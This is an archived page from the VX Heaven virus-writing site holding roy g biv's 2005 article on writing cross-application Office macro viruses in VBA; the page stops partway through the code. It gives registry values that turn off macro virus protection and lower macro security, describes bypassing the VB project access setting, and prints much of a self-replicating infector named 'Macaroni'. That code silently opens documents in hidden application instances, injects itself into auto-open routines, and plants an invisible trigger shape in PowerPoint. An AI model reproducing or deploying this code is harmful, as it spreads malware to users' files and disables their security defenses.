<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> roy g biv 'Out of Office Responses' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="roy g biv"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, roy g biv,Out of Office Responses, regwrite, options, codemodule, module, activation, find, applications, office, object, array, instr, security, remove, microsoft, docmd"/>
<meta name="Description" content="Microsoft introduced a very powerful language in Office 97 and later versions, called Visual Basic for Applications. One of the best things about it is that many Office applications can use it. The environment is not quite the &quot;write once, run everywhere&quot;, but with a little bit of code we can support multiple applications very easily."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"f9291d41eed9ac56a1d1e2b3ab3fbc1213215c3e-1498756905-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vrg17.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Out of Office Responses</h1><p><a href="/lib/?lang=en&amp;author=roy%20g%20biv"> roy g biv</a><br/> <em><a href="/vx.php?fid=1413#f1413">Ready Rangers Liberation Front [6]</a></em><br/> <em>February 2005</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vrg17.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vrg17">Back to index</a>] [<a href="/lib/vrg17.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c0">VBA - Virusal Basic for Applications</a></li>
<li><a href="#c1">Resume Next</a></li>
<li><a href="#c2">False Sense of Security</a></li>
<li><a href="#c3">First attempt</a></li>
<li><a href="#c4">Second attempt</a></li>
<li><a href="#c5">Final attempt</a></li>
</ul>
<h2><a name="c0"></a>VBA - Virusal Basic for Applications</h2>
<p>Microsoft introduced a very powerful language in Office 97 and later versions, called Visual Basic for Applications. One of the best things about it is that many Office applications can use it. The environment is not quite the "write once, run everywhere", but with a little bit of code we can support multiple applications very easily.</p>
<p>Let us decide to export our macro source from several different applications. If we know, for example, that the last two characters are different for each of those applications, then we can export our source like this:</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; s = Right(Application.Name, 2)<br/>
&nbsp; &nbsp; t = <span style="color: #800000;">&quot;&quot;</span><br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">If</span> s = <span style="color: #800000;">&quot;rd&quot;</span> <span style="color: #8D38C9; font-weight: bold;">Or</span> s= <span style="color: #800000;">&quot;io&quot;</span> <span style="color: #8D38C9; font-weight: bold;">Then</span> <span style="color: black; font-style: italic;">'Word, Visio<br/>
</span> &nbsp; &nbsp; t = <span style="color: #800000;">&quot;Document&quot;</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #151B8D; font-weight: bold;">Set</span> o = ActiveDocument<br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">ElseIf</span> s = <span style="color: #800000;">&quot;el&quot;</span> <span style="color: #8D38C9; font-weight: bold;">Then</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'Excel<br/>
</span> &nbsp; &nbsp; t = <span style="color: #800000;">&quot;Workbook&quot;</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #151B8D; font-weight: bold;">Set</span> o = ActiveWorkbook<br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">ElseIf</span> s = <span style="color: #800000;">&quot;ct&quot;</span> <span style="color: #8D38C9; font-weight: bold;">Then</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'Project<br/>
</span> &nbsp; &nbsp; t = <span style="color: #800000;">&quot;Project&quot;</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #151B8D; font-weight: bold;">Set</span> o = ActiveProject<br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">Else</span> <span style="color: #8D38C9; font-weight: bold;">If</span> s = <span style="color: #800000;">&quot;nt&quot;</span> <span style="color: #8D38C9; font-weight: bold;">Then</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'PowerPoint<br/>
</span> &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">Set</span> o = ActivePresentation<br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">End</span> <span style="color: #8D38C9; font-weight: bold;">If</span><br/>
&nbsp; &nbsp; o.VBProject.VBComponents(<span style="color: #800000;">&quot;This&quot;</span> + t).Export (<span style="color: #800000;">&quot;c:\file&quot;</span>)<br/>
&nbsp;</div>
<p>Great, this already covers Word, Visio, Excel, Project, and PowerPoint (we call our macro "This" in this example for PowerPoint, to make things simpler). These are all Microsoft Office applications, but we are not limited to just those. If we look here:</p>
<p>http://msdn.microsoft.com/vba/companies/company.asp</p>
<p>we can see many other potential targets. Not all of those are infectable, though. AutoCAD, for example, saves the macros in .dvb files, so they are separated from the drawings (.dwg) files, and do not load automatically.</p>
<p>We must use Active*.VBProject, not VBE.ActiveVBProject (except in Access, see below), because the ActiveVBProject might not be our code if there are other documents open with us, or if the application was launched with our file as a parameter (so the global template loads first and will be the active project).</p>
<p>Maybe you see that Access and Publisher are not supported. For Access, it is because the code is a bit different - there is no ActiveDatabase object, only the CurrentDb object, but it does not expose any Visual Basic components. Instead, we must use the VBE.ActiveVBProject after all.</p>
<p>Publisher is not supported because it does not expose the Visual Basic Object Model. Can a Publisher virus be written? Probably, but not by me. ;)</p>
<h2><a name="c1"></a>Resume Next</h2>
<p>A better alternative is if the code "knows" what kind of object is carrying it, for example by using an array of object names, indexed by a variable that we assign during replication. Then we can use the fact that a runtime error during an assignment prevents the assignment from occurring. Then we can do this instead:</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">On</span> <span style="color: #151B8D; font-weight: bold;">Error</span> <span style="color: #151B8D; font-weight: bold;">Resume</span> <span style="color: #8D38C9; font-weight: bold;">Next</span><br/>
&nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">Set</span> o = ActiveDocument<br/>
&nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">Set</span> o = ActiveWorkbook<br/>
&nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">Set</span> o = ActiveProject<br/>
&nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">Set</span> o = ActivePresentation<br/>
&nbsp; &nbsp; o.VBProject.VBComponents(<span style="color: #800000;">&quot;This&quot;</span> + name(index)).Export (<span style="color: #800000;">&quot;c:\file&quot;</span>)<br/>
&nbsp;</div>
<p>Our "o" variable will be assigned by whichever of the objects is valid, and will not be disturbed by any of the others, since they are invalid.</p>
<h2><a name="c2"></a>False Sense of Security</h2>
<p>After macro viruses became very popular, Microsoft introduced some security measures to make it more difficult to replicate. The first of these was the Macro Virus Protection. The implementation is different in different Office applications, and even in different versions of the same application, however the state of the protection is always stored in the registry. For Office 97, we have these settings, which are under HKCU\Software\Microsoft\Office\8.0:</p>
<table summary="Registry Keys for Macro Protection in Office">
<tr><td><strong>App</strong></td><td><strong>Value</strong></td><td><strong>Type</strong></td><td><strong>Data</strong></td></tr>
<tr><td>Word</td><td>Word\Options\EnableMacroVirusProtection</td><td>REG_SZ</td><td>"0"</td></tr>
<tr><td>Project</td><td>MS Project\Options\General\Macro Virus Protection</td><td>REG_SZ</td><td>"No"</td></tr>
<tr><td>Excel</td><td>Excel\Microsoft Excel\Options6</td><td>REG_DWORD</td><td>0</td></tr>
<tr><td>PowerPoint</td><td>PowerPoint\Options\MacroVirusProtection</td><td>REG_DWORD</td><td>0</td></tr>
</table>
<p>For Office 2000 and later versions (except for Visio), we have these settings, which are under HKCU\Software\Microsoft\Office\x.0 (where 'x' is the version number - 9 for Office 2000, 10 for Office XP, 11 for Office 2003):</p>
<table summary="Registry Keys for Macro Security Level in Office">
<tr><td><strong>App</strong></td><td><strong>Value</strong></td><td><strong>Type</strong></td><td><strong>Data</strong></td></tr>
<tr><td>Word</td><td>Word\Security\Level</td><td>REG_DWORD</td><td>n</td></tr>
<tr><td>Project</td><td>MS Project\Security\Level</td><td>REG_DWORD</td><td>n</td></tr>
<tr><td>Excel</td><td>Excel\Security\Level</td><td>REG_DWORD</td><td>n</td></tr>
<tr><td>PowerPoint</td><td>PowerPoint\Security\Level</td><td>REG_DWORD</td><td>n</td></tr>
</table>
<p>where 'n' is the security level, 1 for Low, 2 for Medium, 3 for High.</p>
<p>For Visio, it is under HKCU\Software\Microsoft\Visio\Security\Level</p>
<p>That's not all. Microsoft introduced in Office 2000 a new problem. The problem is the option called "Trust access to Visual Basic Project". This option prevents a macro from accessing the Visual Basic Object Model. In Office 2003, this option also prevents a program from accessing the VBOM using OLE Automation. It can be bypassed by creating the "AccessVBOM" registry value, in the same location as the "Level" value above, and setting its data to 1. However, if the value existed already, then its data are cached by any running Office application, so there is no effect if a macro changes the data while the application is already running. For that case, there is the COM Application.AutomationSecurity property which will enable macros in files when the value is set to 1, regardless of the registry settings.</p>
<h2><a name="c3"></a>First attempt</h2>
<p>Let's put that all together and create an Office mega-infector.</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">'Macaroni - roy g biv 05/02/05<br/>
</span>a=array(<span style="color: #800000;">&quot;doc&quot;</span>,<span style="color: #800000;">&quot;xls&quot;</span>,<span style="color: #800000;">&quot;ppt&quot;</span>,<span style="color: #800000;">&quot;mdb&quot;</span>,<span style="color: #800000;">&quot;mpp&quot;</span>,<span style="color: #800000;">&quot;vsd&quot;</span>)<br/>
b=array(<span style="color: #800000;">&quot;Word&quot;</span>,<span style="color: #800000;">&quot;Excel&quot;</span>,<span style="color: #800000;">&quot;PowerPoint&quot;</span>,<span style="color: #800000;">&quot;Access&quot;</span>,<span style="color: #800000;">&quot;Project&quot;</span>,<span style="color: #800000;">&quot;Visio&quot;</span>)<br/>
c=array(<span style="color: #800000;">&quot;Document&quot;</span>,<span style="color: #800000;">&quot;WorkBook&quot;</span>,<span style="color: #800000;">&quot;p&quot;</span>,<span style="color: #800000;">&quot;d&quot;</span>,b(4),<span style="color: #800000;">&quot;Document&quot;</span>)<br/>
y=<span style="color: #800000;">&quot;byval z as &quot;</span><br/>
<span style="color: #151B8D; font-weight: bold;">dim</span> d(6)<br/>
d(4)=y+b(4)<br/>
d(5)=y+<span style="color: #800000;">&quot;iv&quot;</span>+c(0)<br/>
e = 0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'spaces must be here because VBA will insert them anyway<br/>
</span>f=<span style="color: #800000;">&quot;This&quot;</span>+c(e)<br/>
g=<span style="color: #800000;">&quot;m&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'our export filename<br/>
</span><span style="color: #151B8D; font-weight: bold;">on</span> <span style="color: #151B8D; font-weight: bold;">error</span> <span style="color: #151B8D; font-weight: bold;">resume</span> <span style="color: #8D38C9; font-weight: bold;">next</span><br/>
vbe.activevbproject.vbcomponents(f).export(g) &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'Access only<br/>
</span><span style="color: #151B8D; font-weight: bold;">set</span> h=activedocument<br/>
<span style="color: #151B8D; font-weight: bold;">set</span> h=activeworkbook<br/>
<span style="color: #151B8D; font-weight: bold;">set</span> h=activeproject<br/>
<span style="color: #151B8D; font-weight: bold;">set</span> h=activepresentation<br/>
h.vbproject.vbcomponents(f).export(g) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'everything else<br/>
</span><span style="color: #151B8D; font-weight: bold;">set</span> i=<span style="color: #E56717; font-weight: bold;">createobject</span>(<span style="color: #800000;">&quot;scripting.filesystemobject&quot;</span>)<br/>
j=i.opentextfile(g).readall<br/>
j=mid(j,instr(j,<span style="color: #800000;">&quot;'M&quot;</span>)) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'remove everything before our code<br/>
</span>j=left(j,instr(j,<span style="color: #800000;">&quot;'&quot;</span>+<span style="color: #800000;">&quot;'&quot;</span>)+1) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'remove everything after our code<br/>
</span>i.getfile(g).delete &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'clean up<br/>
</span>randomize<br/>
e=int(rnd*6)<br/>
f=<span style="color: #800000;">&quot;This&quot;</span>+c(e)<br/>
g=instr(j,<span style="color: #800000;">&quot;e = &quot;</span>)<br/>
k=vbcrlf<br/>
g=k+left(j,g+3)+cstr(e)+mid(j,g+5)+k+<span style="color: #800000;">&quot;end &quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'save container type for next time<br/>
</span><span style="color: #151B8D; font-weight: bold;">set</span> j=<span style="color: #E56717; font-weight: bold;">createobject</span>(<span style="color: #800000;">&quot;wscript.shell&quot;</span>)<br/>
l=<span style="color: #800000;">&quot;HKCU\software\microsoft\&quot;</span><br/>
m=l+<span style="color: #800000;">&quot;office\8.0\&quot;</span><br/>
n=<span style="color: #800000;">&quot;REG_SZ&quot;</span><br/>
j.regwrite m+<span style="color: #800000;">&quot;Word\Options\EnableMacroVirusProtection&quot;</span>,0,n<br/>
j.regwrite m+<span style="color: #800000;">&quot;MS Project\Options\General\Macro Virus Protection&quot;</span>,<span style="color: #800000;">&quot;No&quot;</span>,n<br/>
n=<span style="color: #800000;">&quot;REG_DWORD&quot;</span><br/>
j.regwrite m+<span style="color: #800000;">&quot;Excel\Microsoft Excel\Options6&quot;</span>,0,n<br/>
j.regwrite m+<span style="color: #800000;">&quot;PowerPoint\Options\MacroVirusProtection&quot;</span>,0,n<br/>
m=b(e)<br/>
<span style="color: #8D38C9; font-weight: bold;">if</span> e=4then m=<span style="color: #800000;">&quot;MS &quot;</span>+m<br/>
<span style="color: #8D38C9; font-weight: bold;">for</span> o=9to 12<br/>
&nbsp; p=l<br/>
&nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e&lt;&gt;5then p=p+<span style="color: #800000;">&quot;Office\&quot;</span>+cstr(o)+<span style="color: #800000;">&quot;.0\&quot;</span><br/>
&nbsp; p=p+m+<span style="color: #800000;">&quot;\Security\&quot;</span><br/>
&nbsp; j.regwrite p+<span style="color: #800000;">&quot;Level&quot;</span>,1,n<br/>
&nbsp; j.regwrite p+<span style="color: #800000;">&quot;AccessVBOM&quot;</span>,1,n<br/>
<span style="color: #8D38C9; font-weight: bold;">next</span><br/>
<span style="color: #151B8D; font-weight: bold;">set</span> j=i.getfolder(<span style="color: #800000;">&quot;.&quot;</span>) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'demo version, current directory only<br/>
</span><span style="color: #8D38C9; font-weight: bold;">for</span> <span style="color: #8D38C9; font-weight: bold;">each</span> l <span style="color: #8D38C9; font-weight: bold;">in</span> j.files<br/>
&nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> lcase(i.getextensionname(l))=a(e)<span style="color: #8D38C9; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; l=l.path<br/>
&nbsp; &nbsp; err=0<br/>
&nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> n=i.opentextfile(l,8)<br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> err.number=0then<br/>
&nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=5then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> n=<span style="color: #E56717; font-weight: bold;">createobject</span>(m+<span style="color: #800000;">&quot;.invisibleapp&quot;</span>)<br/>
&nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=4then m=<span style="color: #800000;">&quot;MS&quot;</span>+b(e)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> n=<span style="color: #E56717; font-weight: bold;">createobject</span>(m+<span style="color: #800000;">&quot;.application&quot;</span>)<br/>
&nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> err.number=0then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; n.visible=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; n.application.automationsecurity=1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> o=n.documents<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> o=n.workbooks<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> o=n.presentations<br/>
&nbsp; &nbsp; &nbsp; &nbsp; err=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=3then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; n.opencurrentdatabase(l)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=4then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; n.fileopen(l)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> o=n.activeproject<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=2then n.visible=1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'PowerPoint window is not allowed to be hidden<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #151B8D; font-weight: bold;">set</span> o=o.<span style="color: #151B8D; font-weight: bold;">open</span>(l)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> err.number=0then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> l=n.vbe.activevbproject.vbcomponents(f).codemodule<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> l=o.vbproject.vbcomponents(f).codemodule<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p=<span style="color: #800000;">&quot;_open&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=5then p=<span style="color: #800000;">&quot;_&quot;</span>+c(0)+<span style="color: #800000;">&quot;opened&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p=c(e)+p<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; err=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; l=l.proccountlines(p,0) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'infection marker is presence of code in module of our name<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">if</span> err.number&gt;0then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=2then o.vbproject.vbcomponents.add(1).name=f<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'PowerPoint does not contain any This* module by default<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">if</span> e=3then &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'Access does not contain any This* module by default<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">with</span> n.vbe.activevbproject<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .vbcomponents.add(1).name=f<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> l=.vbcomponents(f).codemodule<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">with</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> l=o.vbproject.vbcomponents(f).codemodule<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o=<span style="color: #800000;">&quot;private &quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q=<span style="color: #800000;">&quot;sub &quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=2or e=3then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o=<span style="color: #800000;">&quot;&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=3then q=<span style="color: #800000;">&quot;function &quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; l.addfromstring(o+q+p+<span style="color: #800000;">&quot;(&quot;</span>+d(e)+<span style="color: #800000;">&quot;)&quot;</span>+g+q) <span style="color: black; font-style: italic;">'all but PowerPoint and Access activation is auto-macro<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">with</span> n.activepresentation &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'PowerPoint activation is via AutoShape click action<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">with</span> .slidemaster<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> l=.shapes.addshape(1,0,0,.width,.height)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">with</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; l.fill.transparency=1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">with</span> l.actionsettings(1)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .action=8<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .run=p<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">with</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .save<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .<span style="color: #8D38C9; font-weight: bold;">close</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">with</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=3then &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'Access activation is via form open<br/>
